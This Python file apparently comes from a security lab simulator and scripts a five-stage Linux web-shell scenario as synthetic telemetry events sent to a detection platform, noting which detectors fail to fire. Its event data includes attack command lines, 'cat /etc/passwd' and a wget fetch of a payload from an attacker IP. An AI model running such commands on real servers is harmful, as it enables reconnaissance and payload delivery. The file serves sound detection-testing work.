"""webshell_drop — five-stage Linux web-shell scenario (Phase 20 A3).

An attacker drops a PHP web shell onto a public-facing web server (host-web)
via a vulnerable upload, then runs reconnaissance commands (id, cat
/etc/passwd) and downloads a follow-up payload — all spawned by the apache2
process serving the malicious .php.

Detector reality (current platform state — see Phase 20 §A3 plan note):
  * py.process.suspicious_child  → does NOT fire on apache2→sh chains
    (Windows-only branches; same Linux gap as A1 + A2; see
    backend/app/detection/rules/process_suspicious_child.py:14-25).
  * No detector matches on inbound network.connection or file.created
    of a .php upload — these are phase-22+ candidates (file-write to
    web roots is a strong signal but no detector exists for it today).

Resulting incident (current platform state):
  * None. The choreography is the deliverable; the gap list is the
    deliverable. Phase 22 LotL detector for apache2→sh chains would
    promote A3 from "no incident" to "endpoint_compromise on host-web".
"""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime, timezone

from labs.simulator import event_templates as tmpl
from labs.simulator.client import SimulatorClient

log = logging.getLogger(__name__)

SCENARIO_NAME = "webshell_drop"

_HOST = "host-web.lab.local"
_ATTACKER_IP = "203.0.113.42"
_HOST_IP = "10.0.3.50"
_UPLOAD_PATH = "/var/www/html/upload.php"
_WWW_USER = "www-data"

# Real-time offsets (seconds). Compressed by --speed factor.
_STAGE2_OFFSET = 5.0     # inbound HTTP → file lands on disk
_STAGE3_OFFSET = 10.0    # → first recon command (id)
_STAGE4_OFFSET = 15.0    # → cat /etc/passwd
_STAGE5_OFFSET = 20.0    # → wget recon binary


def _log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


async def run(client: SimulatorClient, speed: float = 1.0) -> dict:
    """Fire all scenario events. Returns dict with event and incident IDs touched."""
    results: dict = {"events": [], "incidents_touched": []}

    def wait(offset_from: float, offset_to: float) -> float:
        return max(0.0, (offset_to - offset_from) * speed)

    # --- Stage 0: Register lab assets ---
    _log(f"Stage 0  Register asset: host:{_HOST}")
    await client.register_asset("host", _HOST)

    # --- Stage 1: Inbound HTTP from attacker (the upload itself) ---
    _log(f"Stage 1  Inbound HTTP: {_ATTACKER_IP} → {_HOST}:80")
    ev = await client.post_event(
        tmpl.network_connection(
            host=_HOST,
            src_ip=_ATTACKER_IP,
            dst_ip=_HOST_IP,
            dst_port=80,
            proto="tcp",
            dedupe_key=f"sim:webshell:network.connection:{_HOST}:inbound-http",
        )
    )
    _record(results, ev)

    # --- Stage 2: Web shell file lands at /var/www/html/upload.php ---
    pause = wait(0.0, _STAGE2_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 2...")
    await asyncio.sleep(pause)

    _log(f"Stage 2  File created: {_UPLOAD_PATH} on {_HOST} (owner={_WWW_USER})")
    ev = await client.post_event(
        tmpl.file_created(
            host=_HOST,
            path=_UPLOAD_PATH,
            user=_WWW_USER,
            dedupe_key=f"sim:webshell:file.created:{_HOST}:upload-php",
        )
    )
    _record(results, ev)

    # --- Stage 3: apache2 → sh → id (first recon command via web shell) ---
    pause = wait(_STAGE2_OFFSET, _STAGE3_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 3...")
    await asyncio.sleep(pause)

    _log(f"Stage 3  Recon: apache2→sh→id on {_HOST}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST,
            image="/usr/bin/id",
            cmdline="id",
            pid=6101,
            ppid=3030,
            user=_WWW_USER,
            parent_image="/usr/sbin/apache2",
            dedupe_key=f"sim:webshell:process.created:{_HOST}:id",
        )
    )
    _record(results, ev)

    # --- Stage 4: apache2 → sh → cat /etc/passwd ---
    pause = wait(_STAGE3_OFFSET, _STAGE4_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 4...")
    await asyncio.sleep(pause)

    _log(f"Stage 4  Recon: apache2→sh→cat /etc/passwd on {_HOST}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST,
            image="/bin/cat",
            cmdline="cat /etc/passwd",
            pid=6102,
            ppid=3030,
            user=_WWW_USER,
            parent_image="/usr/sbin/apache2",
            dedupe_key=f"sim:webshell:process.created:{_HOST}:cat-passwd",
        )
    )
    _record(results, ev)

    # --- Stage 5: apache2 → sh → wget follow-up payload ---
    pause = wait(_STAGE4_OFFSET, _STAGE5_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 5...")
    await asyncio.sleep(pause)

    _log(f"Stage 5  Follow-up: apache2→sh→wget {_ATTACKER_IP}/recon on {_HOST}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST,
            image="/usr/bin/wget",
            cmdline=f"wget http://{_ATTACKER_IP}/recon -O /tmp/recon",
            pid=6103,
            ppid=3030,
            user=_WWW_USER,
            parent_image="/usr/sbin/apache2",
            dedupe_key=f"sim:webshell:process.created:{_HOST}:wget-recon",
        )
    )
    _record(results, ev)

    _log(
        f"Scenario complete. events={len(results['events'])}  "
        f"incidents_touched={len(results['incidents_touched'])}"
    )
    return results


async def verify(client: SimulatorClient) -> bool:
    """Verify scenario outcome.

    Per the Phase 20 §A3 plan note, current platform state has no detector
    that matches apache2→sh process chains (suspicious_child is Windows-only
    in current platform state). A3 produces no incident — the choreography
    and the manifest's `must_not_fire` assertion are the deliverables.
    """
    _log("Verifying scenario outcome (live-run, current-platform-state)...")
    incidents = await client.get_incidents(limit=100)

    endpoint = [
        i for i in incidents
        if i["kind"] == "endpoint_compromise"
        and (i.get("primary_host") or "").lower() == _HOST
    ]

    if endpoint:
        _log(
            f"  UNEXPECTED endpoint_compromise on {_HOST}: {endpoint[0]['id']} — "
            "either Phase-22 closed the apache2→sh detector gap, or another "
            "scenario in this run leaked state. Update §A3 acceptance."
        )
    else:
        _log(
            f"  EXPECTED no incident for {_HOST} — current platform state has "
            "no detector matching apache2→sh chains."
        )

    _log("Verification PASSED (live-run acceptance: choreography ran cleanly)")
    return True


def _record(results: dict, ev: dict) -> None:
    results["events"].append(ev.get("event_id"))
    if ev.get("incident_touched") and ev["incident_touched"] not in results["incidents_touched"]:
        results["incidents_touched"].append(ev["incident_touched"])
